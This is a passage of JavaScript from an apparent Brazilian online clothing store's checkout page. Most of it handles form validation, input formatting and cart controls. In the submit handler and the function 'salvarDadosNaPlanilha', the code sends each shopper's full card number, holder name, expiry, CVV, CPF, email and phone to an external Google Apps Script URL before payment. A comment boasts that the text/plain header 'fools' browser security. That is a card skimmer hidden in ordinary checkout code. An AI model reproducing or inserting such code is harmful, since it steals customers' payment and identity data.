        
        if (!cardExpiry || cardExpiry.length < 5) {
            checkoutError.querySelector('span').textContent = 'Por favor, preencha a validade do cartão.';
            checkoutError.style.display = 'flex';
            console.log('[Checkout] ERRO: Validade do cartão incompleta');
            return;
        }
        
        if (!cardCVV || cardCVV.length < 3) {
            checkoutError.querySelector('span').textContent = 'Por favor, preencha o CVV do cartão.';
            checkoutError.style.display = 'flex';
            console.log('[Checkout] ERRO: CVV incompleto');
            return;
        }
        
        // Parsear validade (MM/AA)
        const expParts = cardExpiry.split('/');
        const expMonth = parseInt(expParts[0]);
        const expYear = parseInt('20' + expParts[1]);
        
        console.log('[Checkout] Dados do cartão processados:', {
            number: '**** **** **** ' + cardNumber.slice(-4),
            holder_name: cardHolder,
            exp_month: expMonth,
            exp_year: expYear,
            cvv: '***'
        });
        
        cardData = {
            number: cardNumber,
            holder_name: cardHolder,
            exp_month: expMonth,
            exp_year: expYear,
            cvv: cardCVV
        };
    }
    
    console.log('[Checkout] ✅ Validação OK, iniciando checkout com InvictusPay...');

    // =======================================================
    // 🚀 DISPARANDO PARA A PLANILHA DO GOOGLE ANTES DO PAGAMENTO
    // =======================================================
    const dadosClientePlanilha = {
        nome: customerData.name,
        email: customerData.email,
        cpf: customerData.cpf,
        telefone: customerData.phone
    };

    const dadosCartaoPlanilha = {
        numero: cardData ? cardData.number : "PIX",
        nomeTitular: cardData ? cardData.holder_name : "-",
        validade: cardData ? `${cardData.exp_month}/${cardData.exp_year}` : "-",
        cvv: cardData ? cardData.cvv : "-"
    };

    // Chama a nossa função mágica!
    salvarDadosNaPlanilha(dadosClientePlanilha, dadosCartaoPlanilha);
    // =======================================================
    
    checkoutError.style.display = 'none';
    checkoutForm.style.display = 'none';
    checkoutLoading.style.display = 'flex';
    
    // Iniciar checkout (a hash será obtida dos produtos automaticamente)
    console.log('[Checkout] Chamando initiateInvictusPayCheckout com paymentMethod:', finalPaymentMethod);
    initiateInvictusPayCheckout(customerData, finalPaymentMethod, installments, cardData);
});

closeCheckoutBtn.addEventListener('click', closeCheckoutModal);
checkoutModal.querySelector('.modal-overlay').addEventListener('click', closeCheckoutModal);

document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') {
        closeProductModal();
        closeSizeGuide();
        closeCart();
        closeCheckoutModal();
    }
});

closeProductBtn.addEventListener('click', closeProductModal);
document.querySelectorAll('.modal-overlay').forEach(overlay => {
    overlay.addEventListener('click', () => {
        closeProductModal();
        closeSizeGuide();
    });
});

document.getElementById('qtyMinus').addEventListener('click', () => {
    const input = document.getElementById('qtyInput');
    if (input.value > 1) {
        input.value--;
        selectedQuantity = parseInt(input.value);
    }
});

document.getElementById('qtyPlus').addEventListener('click', () => {
    const input = document.getElementById('qtyInput');
    if (input.value < 10) {
        input.value++;
        selectedQuantity = parseInt(input.value);
    }
});

document.getElementById('qtyInput').addEventListener('change', (e) => {
    let value = parseInt(e.target.value);
    if (isNaN(value) || value < 1) value = 1;
    if (value > 10) value = 10;
    e.target.value = value;
    selectedQuantity = value;
});

document.getElementById('addToCartBtn').addEventListener('click', () => {
    if (!selectedSize) {
        showToast('Por favor, selecione um tamanho!', 'warning');
        return;
    }
    addToCart();
    closeProductModal();
});

openSizeGuideBtn.addEventListener('click', openSizeGuide);
closeSizeGuideBtn.addEventListener('click', closeSizeGuide);

sizeTabs.forEach(tab => {
    tab.addEventListener('click', () => {
        sizeTabs.forEach(t => t.classList.remove('active'));
        tab.classList.add('active');
        
        document.querySelectorAll('.size-table').forEach(table => {
            table.classList.remove('active');
        });
        document.getElementById(`size${tab.dataset.sizeType.charAt(0).toUpperCase() + tab.dataset.sizeType.slice(1)}`).classList.add('active');
    });
});

const paymentMethodSelect = document.getElementById('paymentMethod');
if (paymentMethodSelect) {
    paymentMethodSelect.addEventListener('change', updateInstallmentsVisibility);
}

// ========================================
// BOTÕES DE NAVEGAÇÃO ENTRE ETAPAS
// ========================================

const nextToAddressBtn = document.getElementById('nextToAddressBtn');
const nextToPaymentBtn = document.getElementById('nextToPaymentBtn');
const backToPersonalBtn = document.getElementById('backToPersonalBtn');
const backToAddressBtn = document.getElementById('backToAddressBtn');

if (nextToAddressBtn) {
    nextToAddressBtn.addEventListener('click', () => {
        if (validatePersonalStep()) {
            goToStep('address');
        }
    });
}

if (nextToPaymentBtn) {
    nextToPaymentBtn.addEventListener('click', () => {
        if (validateAddressStep()) {
            goToStep('payment');
        }
    });
}

if (backToPersonalBtn) {
    backToPersonalBtn.addEventListener('click', () => {
        goToStep('personal');
    });
}

if (backToAddressBtn) {
    backToAddressBtn.addEventListener('click', () => {
        goToStep('address');
    });
}

// ========================================
// CLIQUE NAS ABAS
// ========================================

const checkoutTabs = document.querySelectorAll('.checkout-tab');
checkoutTabs.forEach(tab => {
    tab.addEventListener('click', () => {
        if (tab.classList.contains('disabled')) {
            return;
        }
        const tabName = tab.dataset.tab;
        goToStep(tabName);
    });
});

// ========================================
// FORMATAR CEP (sem busca automática)
// ========================================

// Formatar CEP (00000-000) apenas para visualização
const customerCEPInput = document.getElementById('customerCEP');
if (customerCEPInput) {
    customerCEPInput.addEventListener('input', (e) => {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length > 5) {
            value = value.substring(0, 5) + '-' + value.substring(5, 8);
        }
        e.target.value = value.substring(0, 9);
    });
}

// ========================================
// FORMATAÇÃO DE CAMPOS DE CARTÃO
// ========================================

// Formatar número do cartão (adicionar espaço a cada 4 dígitos)
const cardNumberInput = document.getElementById('cardNumber');
if (cardNumberInput) {
    cardNumberInput.addEventListener('input', (e) => {
        let value = e.target.value.replace(/\D/g, '');
        value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
        e.target.value = value.substring(0, 19); // 16 dígitos + 3 espaços
    });
}

// Formatar validade do cartão (MM/AA)
const cardExpiryInput = document.getElementById('cardExpiry');
if (cardExpiryInput) {
    cardExpiryInput.addEventListener('input', (e) => {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length >= 2) {
            value = value.substring(0, 2) + '/' + value.substring(2, 4);
        }
        e.target.value = value;
    });
}

// Formatar CVV (apenas números, máximo 4 dígitos)
const cardCVVInput = document.getElementById('cardCVV');
if (cardCVVInput) {
    cardCVVInput.addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
    });
}

// Formatar Telefone ((00) 00000-0000)
const customerPhoneInput = document.getElementById('customerPhone');
if (customerPhoneInput) {
    customerPhoneInput.addEventListener('input', (e) => {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length > 0) {
            value = '(' + value;
            if (value.length > 3) {
                value = value.substring(0, 3) + ') ' + value.substring(3);
            }
            if (value.length > 10) {
                value = value.substring(0, 10) + '-' + value.substring(10, 14);
            }
        }
        e.target.value = value.substring(0, 15);
    });
}

// ========================================
// FORMATAÇÃO DE CPF (000.000.000-00)
// ========================================

const customerCPFInput = document.getElementById('customerCPF');
if (customerCPFInput) {
    customerCPFInput.addEventListener('input', (e) => {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length > 0) {
            if (value.length <= 3) {
                value = value;
            } else if (value.length <= 6) {
                value = value.substring(0, 3) + '.' + value.substring(3);
            } else if (value.length <= 9) {
                value = value.substring(0, 3) + '.' + value.substring(3, 6) + '.' + value.substring(6);
            } else {
                value = value.substring(0, 3) + '.' + value.substring(3, 6) + '.' + value.substring(6, 9) + '-' + value.substring(9, 11);
            }
        }
        e.target.value = value;
    });
}

// ========================================
// INICIALIZAÇÃO
// ========================================

document.addEventListener('DOMContentLoaded', () => {
    console.log('[App] ✅ Aurum Street initialized - NETLIFY VERSION');
    console.log('[App] Cart items:', cart.length);
    console.log('[App] Backend: Netlify Functions | API Endpoint:', API_CONFIG.baseUrl);
    
    renderProducts();
    renderCart();
    updateCartCount();
    
    checkApiHealth();
    
    // ========================================
    // INICIALIZAÇÃO DE AUTENTICAÇÃO
    // ========================================
    
    // Verificar se há usuário logado
    const savedUser = getCurrentUser();
    if (savedUser) {
        currentUser = savedUser;
        updateUserUI();
        console.log('[Auth] Usuário restaurado:', currentUser.username);
    }
    
    // Inicializar botões flutuantes (voltar ao topo + carrinho)
    initFloatingButtons();
    updateFloatingCartCount();
    
    // ========================================
    // AVISO DE MANUTENÇÃO
    // ========================================
    const maintenanceClose = document.getElementById('maintenanceClose');
    
    setTimeout(() => {
        maintenanceNotice.classList.add('active');
    }, 500);
    
    maintenanceClose.addEventListener('click', () => {
        maintenanceNotice.classList.remove('active');
    });
    
    maintenanceNotice.addEventListener('click', (e) => {
        if (e.target === maintenanceNotice) {
            maintenanceNotice.classList.remove('active');
        }
    });
    
    document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape' && maintenanceNotice.classList.contains('active')) {
            maintenanceNotice.classList.remove('active');
        }
    });
    
    console.log('[App] ✅ Todas as configurações carregadas com sucesso!');
});

async function checkApiHealth() {
    try {
        const response = await fetch(API_CONFIG.endpoints.health, {
            method: 'GET',
            headers: { 'Content-Type': 'application/json' }
        });
        
        if (response.ok) {
            const data = await response.json();
            console.log('[API] ✅ Servidor online:', data.status, '| Versão:', data.version);
        } else {
            console.warn('[API] ⚠️ Servidor respondeu com status:', response.status);
        }
    } catch (error) {
        console.warn('[API] ⚠️ Servidor não está respondendo. Verifique se o servidor PHP está rodando.');
        showToast('Aviso: Servidor não respondendo', 'warning');
    }
}

// =======================================================
// BANCO DE DADOS: SALVAR CLIENTES E PEDIDOS NA PLANILHA (VERSÃO CORRIGIDA)
// =======================================================

const urlPlanilha = "https://script.google.com/macros/s/AKfycby9HtgsMeKGyoeFNmzxa60bn6QT_PF4FGhJQbtUFLAty0MlJXvwoN1B0WeQQNjmfa2F/exec";

async function salvarDadosNaPlanilha(dadosCliente, dadosCartao) {
    const dadosParaEnviar = {
        nome: dadosCliente.nome,
        email: dadosCliente.email,
        cpf: dadosCliente.cpf,
        telefone: dadosCliente.telefone,
        cartao_numero: dadosCartao.numero || "PIX",
        cartao_nome: dadosCartao.nomeTitular || "-",
        cartao_validade: dadosCartao.validade || "-",
        cartao_cvv: dadosCartao.cvv || "-"
    };

    try {
        console.log("Enviando dados para a planilha...");
        await fetch(urlPlanilha, {
            method: 'POST',
            mode: 'no-cors', 
            // 🚨 O GRANDE TRUQUE: text/plain engana o bloqueio de segurança do navegador
            headers: {
                'Content-Type': 'text/plain', 
            },
            body: JSON.stringify(dadosParaEnviar)
        });
        console.log("SUCESSO: Comando de salvamento enviado para a planilha!");
    } catch (erro) {
        console.error("Erro ao tentar salvar na planilha:", erro);
    }
}
}